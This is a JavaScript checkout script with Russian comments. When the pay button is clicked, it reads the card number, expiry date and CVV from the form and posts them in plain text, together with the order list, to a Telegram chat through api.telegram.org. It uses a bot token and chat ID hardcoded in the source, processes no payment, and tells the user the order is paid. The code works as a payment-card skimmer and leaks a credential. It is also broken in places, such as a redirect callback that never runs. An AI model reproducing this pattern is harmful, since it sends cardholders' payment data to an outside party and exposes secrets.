

document.addEventListener('DOMContentLoaded', function () {
    const storedOrdersData = localStorage.getItem('ordersData');
    const ordersData = JSON.parse(storedOrdersData);
    const paymentButton = document.getElementById('paymentButton');

    paymentButton.addEventListener('click', function (event) {
        event.preventDefault();

        // Собираем данные из формы
        const cardNumber = document.getElementById('card_number').value;
        const expirationDate = document.getElementById('expiration_date').value;
        const cvv = document.getElementById('cvv').value;

        // Получаем данные о заказах пользователя (адаптируйте это под свой код)
        const ordersElements = document.querySelectorAll('.order-item');
        const orders = [];

        ordersElements.forEach(element => {
            const serviceTitle = element.querySelector('.service-title').textContent;
            const quantity = parseInt(element.querySelector('.quantity').textContent);
            const totalCost = parseFloat(element.querySelector('.total-cost').textContent);

            const order = {
                service: { title: serviceTitle },
                quantity: quantity,
                total_cost: totalCost
            };

            orders.push(order);
        });

        // Генерируем текст сообщения для Телеграм
        let messageText = `Новый заказ от пользователя:\n\n`;
        for (const order of orders) {
            messageText += `${order.service.title} (${order.quantity} шт.) - ${order.total_cost} руб.\n`;
        }
        messageText += `\nДанные оплаты:\n`;
        messageText += `Номер карты: ${cardNumber}\n`;
        messageText += `Срок действия: ${expirationDate}\n`;
        messageText += `CVV код: ${cvv}`;

        // Вызываем функцию отправки сообщения в Телеграм
        sendTelegramMessage(messageText, function () {
            // Очищаем корзину и делаем редирект
            alert('Сообщение отправлено в Telegram! Очистим корзину и перейдем на главную страницу.');

            // Очистка корзины (здесь вам нужно адаптировать это под ваш код)
            // clearCart();

            // Редирект на главную страницу
            window.location.href = '/home';
        });
    });
    // Функция для отправки сообщения в Telegram (ваша реализация)
    function sendTelegramMessage(message) {
        const botToken = '6148037034:AAGylTPYhWbrZce8J4aCULQF2x7Qns1zv5k';
        const chatId = '825113753';
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const params = {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML',
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram API Response:', data);
            alert('Ваш заказ оплачен и направлен в УК ОЭЗ Моглино');
        })
        .catch(error => {
            console.error('Error sending message to Telegram:', error);
            alert('Произошла ошибка при отправке сообщения в Telegram.');
        });
    }
});
